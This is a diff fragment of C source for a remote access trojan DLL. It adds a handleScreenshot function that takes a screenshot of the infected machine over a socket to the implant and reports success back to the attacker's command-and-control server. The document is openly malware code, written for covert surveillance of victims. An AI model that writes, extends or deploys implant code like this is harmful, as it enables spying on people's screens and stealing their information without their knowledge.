@@ -8,6 +8,40 @@
 #include "RAT-Dll-DeleteFile.h"
 
 
+/** Handle socket work and function calls for performing screenshot functionality
+params:
+* clientSock - current open client socket to implant
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
+INT handleScreenshot(__in SOCKET clientSock)
+{
+	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
+	CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];
+
+	status = performScreenshot(clientSock);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::handleScreenshot - Failure recevied from performScreenshot %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	// Tell our C2 success again since we deleted the file as well...
+	status = sendSuccess(clientSock);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::handleScreenshot - Failure recevied from sendSuccess %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+
+cleanup:
+	return status;
+}
+
+
 /** This function will perform a screenshot for us 
 params:
 * clientSock - current socket connection with our C2
